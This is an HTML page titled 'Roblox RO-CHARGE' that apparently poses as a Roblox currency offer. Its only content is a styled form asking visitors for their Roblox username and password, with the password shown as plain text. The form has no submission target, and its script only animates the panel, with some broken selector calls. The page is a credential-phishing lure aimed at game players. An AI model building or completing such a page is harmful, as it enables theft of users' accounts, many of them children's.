<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Roblox RO-CHARGE</title>
    <style>
        body {
            margin: 40px 0;
            font-family: "Raleway", sans-serif;
            font-size: 14px;
            font-weight: 500;
            background-color: #BCAAA4;
            background-image: url('https://github.com/rocharge/Roblox-RO-CHARGE/raw/main/wallpaperflare.com_wallpaper(12).jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed; /* Фон будет фиксирован при прокрутке */
            -webkit-font-smoothing: antialiased;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            perspective: 1000px;
            margin: 0; /* Удаляем внешние отступы */
        }

        .form-container {
            position: relative;
            width: 400px;
            padding: 40px 80px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            backdrop-filter: blur(10px);
            box-shadow: rgba(255, 255, 255, 0.2) 0 0 40px 5px, white 0 0 0 1px, rgba(0, 0, 0, 0.66) 0 30px 60px 0, inset #333 0 0 0 5px, inset white 0 0 0 6px;
            transition: transform 0.2s ease;
            overflow: hidden;
        }

        .form-container::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: url('');
            background-size: cover;
            background-position: center;
            filter: blur(8px);
            transition: transform 0.2s ease;
        }

        form {
            position: relative;
            z-index: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        label {
            display: block;
            margin-bottom: 10px;
            font-size: 18px;
        }

        input[type="text"] {
            width: 100%;
            padding: 10px;
            border-radius: 10px;
            border: 2px solid #ccc;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(5px);
            box-sizing: border-box;
            margin-bottom: 10px;
            color: black;
        }

        button {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 10px;
            background-color: #0066cc;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }

        button:hover {
            background-color: #005bb5;
        }

        input[type="text"]::placeholder {
            color: rgba(0, 0, 0, 0.7);
        }
    </style>
</head>
<body>
    <div class="form-container" id="form-container">
        <form id="form">
            <label for="username">Enter your Roblox account name:</label>
            <input id="username" type="text" name="username" placeholder="Username" required>
            
            <label for="password">Enter your Roblox account password:</label>
            <input id="password" type="text" name="password" placeholder="Password" required>
            
            <button type="submit">Submit</button>
        </form>
    </div>

    <script>
        const formContainer = document.getElementById('form-container');

        formContainer.addEventListener('mousemove', (e) => {
            const { width, height } = formContainer.getBoundingClientRect();
            const { offsetX, offsetY } = e;
            const rotateX = ((offsetY / height) - 0.5) * -10; // Используем отрицательные значения для смещения от курсора
            const rotateY = ((offsetX / width) - 0.5) * 10;
            formContainer.style.transform = `rotateX(${rotateX}deg) rotateY(${rotateY}deg)`;

            // Параллакс-эффект для изображения
            const parallaxX = ((offsetX / width) - 0.5) * 20;
            const parallaxY = ((offsetY / height) - 0.5) * 20;
            formContainer.querySelector('::before').style.transform = `translate(${parallaxX}px, ${parallaxY}px) scale(1.1)`;
        });

        formContainer.addEventListener('mouseleave', () => {
            formContainer.style.transform = 'rotateX(0) rotateY(0)';
            formContainer.querySelector('::before').style.transform = 'translate(0, 0) scale(1)';
        });
    </script>
</body>
</html>
